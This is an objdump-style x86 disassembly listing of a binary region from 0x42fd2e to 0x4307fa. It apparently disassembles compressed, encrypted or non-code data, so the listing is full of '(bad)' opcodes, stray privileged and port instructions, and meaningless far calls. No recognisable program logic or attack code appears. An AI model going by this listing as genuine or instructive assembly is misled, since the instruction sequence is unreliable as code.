  42fd2e:	les    edi,FWORD PTR [ecx+eax*1+0x6e]
  42fd32:	cmc    
  42fd33:	dec    ebp
  42fd34:	js     0x42fd99
  42fd36:	mov    esi,0x68426f6d
  42fd3b:	sbb    ah,bl
  42fd3d:	out    dx,eax
  42fd3e:	sar    BYTE PTR [ecx],cl
  42fd40:	and    al,0x9f
  42fd42:	push   ecx
  42fd43:	or     edi,ebx
  42fd45:	mov    ds:0xa3dcf5f3,eax
  42fd4a:	(bad)  [ebp+0x2baf035b]
  42fd50:	hlt    
  42fd51:	repz (bad) 
  42fd53:	rcr    BYTE PTR [ebx],cl
  42fd55:	cmp    eax,DWORD PTR [esi+0x54]
  42fd58:	pop    ebx
  42fd59:	mov    al,0x5b
  42fd5b:	repz rcr DWORD PTR [edx+edx*8+0x40a3b4d6],1
  42fd63:	daa    
  42fd64:	lock div cl
  42fd67:	jo     0x42fd0f
  42fd69:	mov    esi,0x7d74d6f7
  42fd6e:	(bad)
  42fd72:	pusha  
  42fd73:	sbb    DWORD PTR [edx+0xb17ecf6],ecx
  42fd79:	push   ecx
  42fd7a:	adc    al,0xdc
  42fd7c:	call   0xd2b5b780
  42fd81:	sti    
  42fd82:	fild   WORD PTR [eax]
  42fd84:	mov    ebp,0x148774ca
  42fd89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd8a:	mov    dh,al
  42fd8c:	pop    esp
  42fd8d:	and    DWORD PTR [edx+0x5f],0x59
  42fd91:	or     ch,BYTE PTR [eax]
  42fd93:	retf   
  42fd94:	add    al,0xe3
  42fd96:	pop    es
  42fd97:	sub    eax,0x43214e1a
  42fd9c:	cs xchg esp,eax
  42fd9e:	(bad)  
  42fd9f:	(bad)  
  42fda0:	mov    ds:0xf343a134,al
  42fda5:	mov    bl,0x60
  42fda7:	xchg   ecx,eax
  42fda8:	pop    ss
  42fda9:	adc    BYTE PTR [eax+0x47],al
  42fdac:	and    BYTE PTR [ecx+edx*2],cl
  42fdaf:	sub    BYTE PTR [ebp-0x3b],al
  42fdb2:	fs mov ah,0x32
  42fdb5:	xor    esp,ebx
  42fdb7:	ficomp DWORD PTR [esi+0xb]
  42fdba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fdbb:	pop    ebp
  42fdbc:	(bad)  
  42fdbd:	push   cs
  42fdbe:	es je  0x42fd98
  42fdc1:	pop    ss
	...
  42fe32:	add    BYTE PTR [eax],al
  42fe34:	ret    
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	mov    dh,0x7c
  42fe42:	(bad)  
  42fe43:	push   ebx
  42fe44:	dec    esp
  42fe45:	cli    
  42fe46:	add    DWORD PTR [eax],eax
  42fe48:	test   BYTE PTR [eax],0x0
  42fe4b:	add    BYTE PTR [edi+0x3d],ah
  42fe4e:	popf   
  42fe4f:	or     eax,0x1a9e1315
  42fe54:	add    al,0x9d
  42fe56:	loope  0x42fe66
  42fe58:	jnp    0x42fe89
  42fe5a:	in     al,dx
  42fe5b:	push   ds
  42fe5c:	in     al,dx
  42fe5d:	(bad)  
  42fe5e:	mov    al,0xb0
  42fe60:	mov    dl,dh
  42fe62:	mov    ebp,0x63968af4
  42fe67:	call   FWORD PTR [ebp-0x58db4b1d]
  42fe6d:	sub    DWORD PTR [ecx],edi
  42fe6f:	push   eax
  42fe70:	loop   0x42fecf
  42fe72:	and    dh,ch
  42fe74:	add    bl,BYTE PTR [esp+ebp*2+0x7c]
  42fe78:	mov    bl,0x3a
  42fe7a:	push   es
  42fe7b:	(bad)  
  42fe7c:	stc    
  42fe7d:	lods   eax,DWORD PTR ds:[esi]
  42fe7e:	lock adc DWORD PTR [ecx-0xc],eax
  42fe82:	pop    ebx
  42fe83:	mov    bl,0x1c
  42fe85:	mov    al,ds:0x3754dbad
  42fe8a:	or     eax,0xbd4b4f77
  42fe8f:	sti    
  42fe90:	sbb    DWORD PTR [ebx-0x41eaa820],eax
  42fe96:	or     edi,DWORD PTR [ebx+ebp*8]
  42fe99:	(bad)  
  42fe9b:	int3   
  42fe9c:	mov    ah,BYTE PTR [esi]
  42fe9e:	test   BYTE PTR [ecx],al
  42fea0:	jb     0x42ff08
  42fea2:	xor    al,0x2c
  42fea4:	pop    ecx
  42fea5:	mov    edx,0x11c0b3a1
  42feaa:	out    dx,eax
  42feab:	mov    dl,0x19
  42fead:	enter  0x611,0x9a
  42feb1:	mov    esp,0xdc773278
  42feb6:	pop    ecx
  42feb7:	aam    0x4e
  42feb9:	sti    
  42feba:	jmp    0x42fe9f
  42febc:	xchg   DWORD PTR [edi-0x7401d32d],ebp
  42fec2:	or     eax,0x1617ab5
  42fec7:	shl    DWORD PTR [ebx+ecx*2+0x6d],1
  42fecb:	fadd   QWORD PTR [ecx+ebx*2]
  42fece:	icebp  
  42fecf:	xor    BYTE PTR [ecx-0x1b],bh
  42fed2:	and    ecx,DWORD PTR [edi+0x9334e67]
  42fed8:	jno    0x42fed9
  42feda:	push   edi
  42fedb:	jnp    0x42ff18
  42fedd:	mov    ebx,0x9849127
  42fee2:	add    al,0xe5
  42fee4:	das    
  42fee5:	xor    cl,BYTE PTR [ebp+edi*4-0x57]
  42fee9:	shr    BYTE PTR [edi-0x2f],0x7e
  42feed:	xor    eax,0x760ee560
  42fef2:	cmp    eax,DWORD PTR [esi+0x7dd4e004]
  42fef8:	je     0x42fec2
  42fefa:	rol    BYTE PTR [ebx+0x57d3e766],1
  42ff00:	inc    esp
  42ff01:	mov    esi,DWORD PTR [ecx+0x7325e1ea]
  42ff07:	aad    0xd3
  42ff09:	ja     0x42fea1
  42ff0b:	les    eax,FWORD PTR [esi-0x4c587d03]
  42ff11:	dec    ebx
  42ff12:	idiv   BYTE PTR ds:0x1d1d037c
  42ff18:	arpl   WORD PTR gs:[esi],dx
  42ff1b:	sbb    DWORD PTR es:[edi+ebx*2+0x1fb32295],edx
  42ff23:	mov    esp,0xbb7b9767
  42ff28:	hlt    
  42ff29:	sub    DWORD PTR [eax+esi*2+0x56],esi
  42ff2d:	not    BYTE PTR [ebx+esi*4]
  42ff30:	(bad)  
  42ff31:	xor    esi,edi
  42ff33:	fwait
  42ff34:	test   al,0x83
  42ff36:	daa    
  42ff37:	data16 jns 0x42ff3d
  42ff3a:	arpl   WORD PTR [edx],ax
  42ff3c:	hlt    
  42ff3d:	sbb    ecx,DWORD PTR [esi*4+0xbe37]
	...
  42ffb4:	adc    bh,BYTE PTR [esi]
  42ffb6:	int    0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx-0x23768016]
  42ffc1:	aaa    
  42ffc2:	pop    ebx
  42ffc3:	repnz inc edx
  42ffc5:	sti    
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	test   BYTE PTR [eax],0x0
  42ffcb:	add    al,al
  42ffcd:	fimul  WORD PTR ds:0x5819782e
  42ffd3:	loope  0x42ffa4
  42ffd5:	mov    ebx,0x10f9b0ab
  42ffda:	lea    ecx,ds:0x25230393
  42ffe0:	dec    ecx
  42ffe1:	inc    esp
  42ffe2:	push   esi
  42ffe3:	inc    esi
  42ffe4:	scas   eax,DWORD PTR es:[edi]
  42ffe5:	cmp    BYTE PTR [esi],cl
  42ffe7:	imul   ecx
  42ffe9:	mov    esp,0x7e448960
  42ffee:	push   ecx
  42ffef:	mov    ah,0x21
  42fff1:	mov    ebp,0x3b9789f
  42fff6:	loope  0x430023
  42fff8:	pushf  
  42fff9:	leave  
  42fffa:	and    eax,0xc493cf05
  42ffff:	push   esi
  430000:	gs push ecx
  430002:	mov    ah,BYTE PTR [esi+0x1983bb9]
  430008:	add    eax,0x8208ae54
  43000d:	add    DWORD PTR [esi],edi
  43000f:	jmp    FWORD PTR [bx+si-0x7f]
  430013:	cmp    al,0xf5
  430015:	adc    BYTE PTR [edx],dh
  430017:	mov    edx,ebx
  430019:	push   ss
  43001a:	or     eax,0xdb3a9011
  43001f:	scas   eax,DWORD PTR es:[edi]
  430020:	data16 ds scas al,BYTE PTR es:[edi]
  430023:	mov    BYTE PTR [edx+ebp*1+0x3e04f8f3],bl
  43002a:	inc    edi
  43002b:	shl    BYTE PTR [ebp+edi*8-0x5d9667f9],1
  430032:	div    BYTE PTR [ebp-0x1c]
  430035:	pusha  
  430036:	mov    cl,0x96
  430038:	sbb    al,BYTE PTR [edi+0x3]
  43003b:	push   eax
  43003c:	test   dh,ah
  43003e:	in     eax,dx
  43003f:	in     eax,0x56
  430041:	sbb    BYTE PTR [ecx],cl
  430043:	stos   DWORD PTR es:[edi],eax
  430044:	shl    DWORD PTR [eax+0x5c],0x38
  430048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430049:	jg     0x43000d
  43004b:	fwait
  43004c:	xchg   DWORD PTR [edi],ebp
  43004e:	stos   DWORD PTR es:[edi],eax
  43004f:	gs push edi
  430051:	pop    ebp
  430052:	pusha  
  430053:	ss pop ss
  430055:	push   0xb3dc5b8f
  43005a:	and    BYTE PTR [edi+0x5f],dh
  43005d:	dec    esi
  43005e:	dec    ecx
  43005f:	mov    esp,0x967ed3d7
  430064:	aaa    
  430065:	das    
  430066:	cli    
  430067:	adc    dl,BYTE PTR [eax+0x28]
  43006a:	pushf  
  43006b:	inc    ebx
  43006c:	adc    bl,BYTE PTR [ebx+ebp*4]
  43006f:	call   0x55ed04e9
  430074:	jno    0x430018
  430076:	push   es
  430077:	pop    ebp
  430078:	cmp    al,0xd2
  43007a:	xchg   esi,eax
  43007b:	jmp    0x93b5:0x17ac4938
  430082:	mov    DWORD PTR [eax+eax*8],ebx
  430085:	xchg   edx,eax
  430086:	retf   0x2fa2
  430089:	aad    0x66
  43008b:	retf   
  43008c:	push   ebp
  43008d:	inc    ebp
  43008e:	add    eax,0xad7b0d7a
  430093:	sbb    eax,0xcc93c594
  430098:	push   ss
  430099:	call   0xf634:0x2fa1b306
  4300a0:	xor    BYTE PTR [esi],cl
  4300a2:	clc    
  4300a3:	pop    ds
  4300a4:	pop    ecx
  4300a5:	aam    0x16
  4300a7:	hlt    
  4300a8:	jnp    0x430090
  4300aa:	and    eax,DWORD PTR ds:0x59f6795
  4300b0:	jae    0x43003f
  4300b2:	jmp    0x1e14:0x1545b758
  4300b9:	xchg   edx,eax
  4300ba:	mov    esp,0x6fffb767
  4300bf:	pop    esi
  4300c0:	lahf   
  4300c1:	pop    ecx
	...
  430132:	add    BYTE PTR [eax],al
  430134:	pop    edx
  430135:	es jecxz 0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0x610c:0x4a0ea608
  430144:	cmp    ah,bh
  430146:	add    DWORD PTR [eax],eax
  430148:	test   BYTE PTR [eax],0x0
  43014b:	add    BYTE PTR [esi+eiz*8-0x51],ah
  43014f:	shr    BYTE PTR [edx-0x1e1dd9be],0xfc
  430156:	pop    ds
  430157:	lds    esp,FWORD PTR [eax]
  430159:	loop   0x430193
  43015b:	sbb    dl,cl
  43015d:	into   
  43015e:	push   es
  43015f:	retf   0x87ba
  430162:	mov    ecx,0x875752a2
  430167:	loope  0x430191
  430169:	in     al,dx
  43016a:	pushf  
  43016b:	out    0x71,al
  43016d:	jp     0x43019d
  43016f:	(bad)  
  430171:	and    esp,ebp
  430173:	pop    bp
  430175:	and    al,dh
  430177:	cmp    al,0x45
  430179:	jne    0x43015d
  43017b:	jl     0x430189
  43017d:	xchg   esi,eax
  43017e:	mov    esi,0x9d2b8959
  430184:	pop    ss
  430185:	popa   
  430186:	push   ebx
  430187:	jmp    DWORD PTR [esi-0x3]
  43018a:	int3   
  43018b:	in     eax,0x5
  43018d:	xchg   edi,eax
  43018e:	or     al,0x81
  430190:	dec    edx
  430191:	xor    dl,BYTE PTR [esi+0x6c]
  430194:	in     eax,dx
  430195:	push   0xffffff9c
  430197:	jns    0x430137
  430199:	or     DWORD PTR [edx-0x7b0ced55],edi
  43019f:	outs   dx,BYTE PTR ds:[esi]
  4301a0:	jecxz  0x4301c8
  4301a2:	and    eax,0xa28b64ba
  4301a7:	enter  0x6060,0x42
  4301ab:	loopne 0x4301d8
  4301ad:	mov    ebp,0x6f0b3eef
  4301b2:	test   BYTE PTR [ecx+0x5e910fbd],al
  4301b8:	iret   
  4301b9:	cwde   
  4301ba:	mov    al,0x1d
  4301bd:	mov    bl,0x45
  4301bf:	mov    ah,0xfa
  4301c1:	je     0x4301f6
  4301c3:	sub    BYTE PTR [ebx+ecx*2+0x7e],dl
  4301c7:	jo     0x4301ce
  4301c9:	(bad)  
  4301ca:	scas   al,BYTE PTR es:[edi]
  4301cb:	ficomp DWORD PTR [ebx+0x3a22073c]
  4301d1:	rcl    BYTE PTR [edi],1
  4301d3:	fist   WORD PTR [edx+edi*4+0x18]
  4301d7:	sub    al,0x46
  4301d9:	push   edi
  4301da:	inc    eax
  4301db:	pop    DWORD PTR [ebp+0xc04bb18]
  4301e1:	inc    edi
  4301e2:	dec    eax
  4301e3:	mov    ah,0x59
  4301e5:	int    0x8f
  4301e7:	iret   
  4301e8:	mov    al,0x7f
  4301ea:	and    DWORD PTR [ebp+0x42],edi
  4301ed:	jge    0x4301a9
  4301ef:	and    ecx,DWORD PTR [ecx]
  4301f1:	xchg   edx,eax
  4301f2:	sbb    bh,ah
  4301f4:	or     BYTE PTR [ebx+0x1d],0xc5
  4301f8:	sbb    BYTE PTR [edx+0x3a],bl
  4301fb:	mov    ch,0x30
  4301fd:	sar    DWORD PTR [edi-0x3b],cl
  430200:	ds enter 0xf33,0x4a
  430205:	push   ecx
  430206:	je     0x43022c
  430208:	mov    al,0x55
  43020a:	gs cld 
  43020c:	cmp    edx,DWORD PTR [ebx]
  43020e:	bound  esp,QWORD PTR [ebx]
  430210:	lds    edi,FWORD PTR [ebx+0x9]
  430213:	push   esp
  430214:	dec    esi
  430215:	jge    0x430251
  430217:	pop    es
  430218:	push   ebp
  430219:	fwait
  43021a:	(bad)  
  43021b:	pusha  
  43021c:	add    BYTE PTR ds:0x4d8c49a6,ch
  430222:	inc    edi
  430223:	adc    bl,BYTE PTR [edi+ebx*2-0x17]
  430227:	and    BYTE PTR [ebx+ebx*1],dl
  43022a:	or     al,0x81
  43022c:	arpl   WORD PTR [ebp+0x4a],si
  43022f:	nop
  430230:	cwde   
  430231:	sti    
  430232:	(bad)  
  430233:	xor    eax,0xe5341086
  430238:	call   0xd3a7:0x9684de76
  43023f:	call   0x0:0x7c6f
	...
  4302b2:	add    BYTE PTR [eax],al
  4302b4:	mov    ebp,0xaf8a081a
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	fdiv   DWORD PTR [esi]
  4302c2:	(bad)  
  4302c3:	mov    esi,0x1fd2e
  4302c8:	test   BYTE PTR [eax],0x0
  4302cb:	add    BYTE PTR [ecx+eax*8],dl
  4302ce:	std    
  4302cf:	mov    ebp,0x7e67388b
  4302d4:	inc    ebp
  4302d5:	bnd jbe 0x4302cc
  4302d8:	or     eax,0xdb2625d0
  4302dd:	lds    ecx,FWORD PTR [ebp+0x4a]
  4302e0:	lahf   
  4302e1:	sub    al,0x5c
  4302e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4302e4:	nop
  4302e5:	mov    bl,0x4b
  4302e7:	test   eax,0xcd0c68e8
  4302ec:	mov    cl,0xfd
  4302ee:	test   eax,0x1e86354d
  4302f3:	mov    ebx,DWORD PTR [ebp-0x58]
  4302f6:	adc    DWORD PTR [esi-0x635ed5ec],eax
  4302fc:	pop    ebx
  4302fd:	dec    esp
  4302fe:	bound  ecx,QWORD PTR [ecx]
  430300:	not    DWORD PTR [ebx-0x79ddf26e]
  430306:	push   eax
  430307:	cli    
  430308:	mov    ebx,0x10bc7ebd
  43030d:	not    BYTE PTR [ecx-0x16c080cb]
  430313:	fwait
  430314:	aaa    
  430315:	sub    bh,BYTE PTR [edx+edx*2]
  430318:	mov    al,ds:0x391681f9
  43031d:	and    ah,BYTE PTR [ebx-0xb]
  430320:	inc    ecx
  430321:	test   DWORD PTR [esi-0x7820ea91],ebx
  430327:	movd   DWORD PTR [ebx],mm2
  43032a:	cmp    ecx,DWORD PTR [edx-0x345f926]
  430330:	mov    eax,0x5f1b8eff
  430335:	(bad)
  430339:	clc    
  43033a:	adc    dl,BYTE PTR [ebp+0x382cb944]
  430340:	addps  xmm0,XMMWORD PTR [esi]
  430343:	mov    ch,0x79
  430345:	iret   
  430346:	xlat   BYTE PTR ds:[ebx]
  430347:	shl    BYTE PTR [esi],cl
  430349:	fwait
  43034a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43034b:	adc    DWORD PTR [eax-0x9f2ee96],esi
  430351:	and    eax,0x373db889
  430356:	(bad)  
  430357:	imul   esi,DWORD PTR [edx+0x3c],0xffffffe2
  43035b:	ins    BYTE PTR es:[edi],dx
  43035c:	mov    edi,0x91aae676
  430361:	add    ch,bh
  430363:	icebp  
  430364:	inc    esp
  430365:	inc    ecx
  430366:	jmp    0x4303e2
  430368:	(bad)  
  430369:	add    DWORD PTR [ecx-0xd],edi
  43036c:	adc    edi,DWORD PTR [eax]
  43036e:	inc    edi
  43036f:	fdiv   QWORD PTR [ecx+0x53186dc2]
  430375:	or     DWORD PTR [ebx-0x2b6dcf98],ebx
  43037b:	mov    edx,0x7e0b07c2
  430380:	dec    eax
  430381:	pusha  
  430382:	or     al,0x6
  430384:	lods   al,BYTE PTR ds:[esi]
  430385:	das    
  430386:	mov    cl,BYTE PTR [edi+0x7798a959]
  43038c:	out    dx,eax
  43038d:	shr    BYTE PTR [ebx+0x26],0xdb
  430391:	push   edi
  430392:	das    
  430393:	mov    DWORD PTR [edx+0x236306ec],eax
  430399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43039a:	mov    esp,0x3f3762d3
  43039f:	adc    DWORD PTR [ebp-0x70],0x5fc6e1b9
  4303a6:	pop    ebp
  4303a7:	sbb    DWORD PTR [edx+0x75c980e0],edx
  4303ad:	xchg   BYTE PTR [esi],bh
  4303af:	fidiv  DWORD PTR [esp+eiz*8-0x2c]
  4303b3:	mov    edx,0xa4bfb4b9
  4303b8:	fidiv  WORD PTR [edi]
  4303ba:	pop    es
  4303bb:	jbe    0x430371
  4303bd:	rcr    DWORD PTR [ecx-0x43],0x99
  4303c1:	fiadd  WORD PTR [eax]
	...
  430433:	add    BYTE PTR [edi],dh
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfe24:0x14833e34
  430446:	add    DWORD PTR [eax],eax
  430448:	test   BYTE PTR [eax],0x0
  43044b:	add    al,ch
  43044d:	sub    DWORD PTR [edx+0x2c],eax
  430450:	outs   dx,DWORD PTR ds:[esi]
  430451:	ins    BYTE PTR es:[edi],dx
  430452:	mov    cl,0xcb
  430454:	cmp    ecx,DWORD PTR [edi+edx*8-0x20]
  430458:	mov    eax,0x6f89fbe6
  43045d:	inc    esp
  43045e:	mov    bh,0x36
  430460:	in     al,0x7c
  430462:	push   eax
  430463:	or     BYTE PTR [eax],dl
  430465:	fisttp DWORD PTR [edi+edi*1-0x119f476b]
  43046c:	loop   0x4303fc
  43046e:	cmp    al,0xb9
  430470:	rcl    DWORD PTR [eax-0x4e0888c3],0xc9
  430477:	sahf   
  430478:	pop    eax
  430479:	push   ds
  43047a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43047b:	and    BYTE PTR [esp+ebp*2+0x25],ah
  43047f:	jp     0x4304fa
  430481:	shr    ecx,0xfb
  430484:	jne    0x4304bf
  430486:	jne    0x4304a6
  430488:	sbb    al,0x3c
  43048a:	cmp    BYTE PTR [edi],ch
  43048c:	or     al,0xbe
  43048e:	adc    BYTE PTR [esi],ch
  430490:	cmp    DWORD PTR [ebx-0x2b],esp
  430493:	scas   eax,DWORD PTR es:[edi]
  430494:	mov    cl,0xde
  430496:	int3   
  430497:	push   ecx
  430498:	inc    eax
  430499:	jno    0x430466
  43049b:	or     al,0x81
  43049d:	aas    
  43049e:	add    DWORD PTR [ebx-0x6c],0x38b777bb
  4304a5:	rcr    DWORD PTR [ebx-0x62],1
  4304a8:	(bad)  
  4304a9:	cld    
  4304aa:	dec    esp
  4304ab:	lock out 0xa9,ax
  4304af:	sbb    al,BYTE PTR [eax+ebp*8]
  4304b2:	mov    esp,0x69a67084
  4304b7:	push   ebp
  4304b8:	test   eax,0x49c59177
  4304bd:	call   0xcaa91e22
  4304c2:	inc    esi
  4304c3:	add    eax,0xbb6eefee
  4304c8:	xchg   BYTE PTR [ebx+eiz*8-0x72],dl
  4304cc:	stos   DWORD PTR es:[edi],eax
  4304cd:	mov    ebp,0xe021ed7d
  4304d2:	and    al,0xc2
  4304d4:	lds    ecx,FWORD PTR [esi]
  4304d6:	push   0xbbb7e7f3
  4304db:	daa    
  4304dc:	fisttp DWORD PTR [ebx+0x48059173]
  4304e2:	xor    ch,dl
  4304e4:	cli    
  4304e5:	add    eax,0x6f7689a2
  4304ea:	out    0x56,al
  4304ec:	lods   al,BYTE PTR ds:[esi]
  4304ed:	dec    esi
  4304ee:	mov    bh,BYTE PTR [eax+0x34]
  4304f1:	retf   
  4304f2:	mov    al,ds:0xe11a6ae6
  4304f7:	vmwrite edi,DWORD PTR ds:0x158e9ec0
  4304fe:	(bad)  [edi-0x1]
  430501:	or     DWORD PTR [esp+esi*1-0x50],0x5b
  430506:	xor    DWORD PTR cs:[edx-0x39d8f6d9],esi
  43050d:	cmp    DWORD PTR [ebx-0x205028a5],0x6c
  430514:	push   ebx
  430515:	sub    ecx,DWORD PTR [edx+0x56]
  430518:	mov    WORD PTR [esi],ss
  43051a:	fnstcw WORD PTR [ebx+0x31]
  43051d:	fist   DWORD PTR [edi-0x1c]
  430520:	mov    eax,0x7bb73cd6
  430525:	and    eax,0x6eceee3a
  43052a:	xchg   bp,ax
  43052c:	dec    esi
  43052d:	inc    esp
  43052e:	int    0x5d
  430530:	fiadd  DWORD PTR [edi-0x190bf803]
  430536:	(bad)  
  430538:	jecxz  0x4304e7
  43053a:	xor    ebx,DWORD PTR [edx-0x5]
  43053d:	dec    esi
  43053e:	and    ch,BYTE PTR [ebp+0x71]
  430541:	js     0x430543
	...
  4305b3:	add    BYTE PTR [esi],bh
  4305b5:	push   esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi-0x57]
  4305c1:	cmp    edi,DWORD PTR [eax+0x64]
  4305c4:	sbb    bh,bh
  4305c6:	add    DWORD PTR [eax],eax
  4305c8:	test   BYTE PTR [eax],0x0
  4305cb:	add    BYTE PTR [ebp-0x54],ah
  4305ce:	and    eax,0x78461ef5
  4305d3:	jb     0x43055a
  4305d5:	cld    
  4305d6:	sar    ebp,cl
  4305d8:	and    dh,0xb2
  4305db:	sbb    ch,BYTE PTR [edx]
  4305dd:	jne    0x43064f
  4305df:	loop   0x4305a1
  4305e1:	or     esp,DWORD PTR [ecx+0xb]
  4305e4:	mov    edi,0xb417589b
  4305e9:	xchg   esp,eax
  4305ea:	jb     0x4305d5
  4305ec:	mov    eax,DWORD PTR [eax+0x2]
  4305ef:	push   ds
  4305f0:	aaa    
  4305f1:	fs dec edi
  4305f3:	test   eax,0xfd62015
  4305f8:	jbe    0x430629
  4305fa:	lea    edx,[edi+0x54]
  4305fd:	sub    DWORD PTR [ebp+0x751f7a23],edi
  430603:	test   eax,0xa782b5b2
  430608:	fidiv  DWORD PTR [edx]
  43060a:	mov    eax,0x8b78b133
  43060f:	and    DWORD PTR ds:0xd6b1,esp
  430614:	add    DWORD PTR [ebx],ebp
  430616:	hlt    
  430617:	out    0x65,al
  430619:	inc    edx
  43061a:	pop    ds
  43061b:	mov    edx,0x5ab5164c
  430620:	test   DWORD PTR [edx],ebp
  430622:	cmp    bh,BYTE PTR [eax-0x6b]
  430625:	adc    esp,DWORD PTR [esi-0x7a421f4]
  43062b:	scas   eax,DWORD PTR es:[edi]
  43062c:	cwde   
  43062d:	sbb    eax,0xadb93e60
  430632:	push   ss
  430633:	loopne 0x4305c6
  430635:	or     esp,esi
  430637:	popa   
  430638:	mov    edx,ecx
  43063a:	ret    0x1340
  43063d:	pop    edx
  43063e:	mov    dl,0x76
  430640:	js     0x4305f6
  430642:	stos   BYTE PTR es:[edi],al
  430643:	outs   dx,DWORD PTR ds:[esi]
  430644:	cwde   
  430645:	enter  0x3f85,0xcd
  430649:	xlat   BYTE PTR ds:[ebx]
  43064a:	add    al,0xe6
  43064c:	adc    al,0x32
  43064e:	sub    eax,0x13a3b88
  430653:	or     bh,bl
  430655:	pop    eax
  430656:	jno    0x430651
  430658:	sub    eax,esp
  43065a:	cmp    al,BYTE PTR [ecx]
  43065c:	stos   DWORD PTR es:[edi],eax
  43065d:	push   ebp
  43065e:	mov    BYTE PTR [ebp-0x62],ah
  430661:	out    dx,eax
  430662:	mov    al,0xd0
  430664:	sub    DWORD PTR [ecx-0x726bb315],0x30ae1837
  43066e:	mov    dl,0x2c
  430670:	fsubr  QWORD PTR [ebx+0x7ab3fbd1]
  430676:	ss mov dh,0x52
  430679:	out    dx,al
  43067a:	adc    eax,0x855b679a
  43067f:	sbb    ecx,esi
  430681:	into   
  430682:	mov    bl,0x5e
  430684:	dec    eax
  430685:	popa   
  430686:	add    BYTE PTR [edx],al
  430688:	mov    esp,DWORD PTR [edi+0x5eae832]
  43068e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43068f:	dec    edi
  430690:	mov    esi,0x4803c864
  430695:	mov    al,0x43
  430697:	test   BYTE PTR [ebp-0x310c682],0xe1
  43069e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43069f:	inc    edx
  4306a0:	pop    es
  4306a1:	sbb    eax,0xbab38558
  4306a6:	inc    edx
  4306a7:	xchg   edi,eax
  4306a8:	call   0x81315ccb
  4306ad:	stc    
  4306ae:	mov    esi,0x8fd7afd1
  4306b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4306b4:	int3   
  4306b5:	push   ss
  4306b6:	xor    BYTE PTR [edi],dh
  4306b8:	and    al,0x79
  4306ba:	ja     0x4306f7
  4306bc:	pop    ss
  4306bd:	int    0x68
  4306bf:	push   ds
  4306c0:	push   eax
  4306c1:	fadd   QWORD PTR [eax]
	...
  430733:	add    BYTE PTR [ecx-0x5f],dh
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0x28
  430741:	test   al,0x94
  430743:	out    0x10,eax
  430745:	add    BYTE PTR [edx],al
  430747:	add    dh,dh
  430749:	add    BYTE PTR [eax],al
  43074b:	add    BYTE PTR [ecx],dh
  43074d:	pop    ss
  43074e:	inc    edx
  43074f:	shl    edx,1
  430751:	fdivr  QWORD PTR [ebx+0x5f8a8a0b]
  430757:	pop    ebx
  430758:	jne    0x43074f
  43075a:	popf   
  43075b:	pop    esi
  43075c:	test   al,0x52
  43075e:	int3   
  43075f:	pop    ss
  430760:	dec    edx
  430761:	sub    BYTE PTR ds:0xf2e1564,ch
  430767:	test   DWORD PTR [edx+eax*1-0x3d537929],edx
  43076e:	daa    
  43076f:	rol    BYTE PTR [esi-0x32],0xce
  430773:	test   esp,ebx
  430775:	(bad)  
  430776:	iret   
  430777:	setp   BYTE PTR [edi+0x71]
  43077b:	test   eax,0xee9dc1f
  430780:	xor    BYTE PTR [edi+0x26],ch
  430783:	and    al,0x3f
  430785:	adc    edx,esp
  430787:	daa    
  430788:	jge    0x4307b3
  43078a:	imul   esp,DWORD PTR [ecx],0xb
  43078d:	les    eax,FWORD PTR [edx]
  43078f:	jge    0x430723
  430791:	and    BYTE PTR [edx-0x483a1181],bh
  430797:	and    DWORD PTR [edi],esp
  430799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43079a:	retf   0xe3ea
  43079d:	(bad)  
  43079e:	jle    0x43074f
  4307a0:	dec    ecx
  4307a1:	fs addr16 test eax,0xc97b8c47
  4307a8:	adc    BYTE PTR [edi-0x7],dh
  4307ab:	push   cs
  4307ac:	lds    ecx,FWORD PTR [ebp-0x5c]
  4307af:	cmp    cl,BYTE PTR [esi]
  4307b1:	es int3 
  4307b3:	sub    eax,0xa90a6def
  4307b8:	push   esi
  4307b9:	xchg   edi,eax
  4307ba:	stos   DWORD PTR es:[edi],eax
  4307bb:	dec    edx
  4307bc:	fldenv [ebx+eax*1+0x55076404]
  4307c3:	mov    bh,0xe
  4307c5:	cmp    DWORD PTR [edi],ebp
  4307c7:	jae    0x4307e3
  4307c9:	fcmovnbe st,st(0)
  4307cb:	neg    BYTE PTR [edi+ebx*4]
  4307ce:	mov    edx,0xf25931be
  4307d3:	fs aad 0x1d
  4307d6:	jp     0x430846
  4307d8:	or     DWORD PTR [ebp-0x4194971c],ebx
  4307de:	mov    ch,0xb
  4307e0:	xchg   edi,eax
  4307e1:	je     0x43080d
  4307e3:	mov    ebp,0x1557f28f
  4307e8:	xchg   edi,eax
  4307e9:	lahf   
  4307ea:	and    eax,0x363bf7ff
  4307ef:	adc    ebx,ebx
  4307f1:	into   
  4307f2:	(bad)  
  4307f4:	mov    ds:0xc14af3a1,al
  4307f9:	pop    eax
  4307fa:	cmp    ebp,DWORD PTR [ebx+eax*4-0x76]
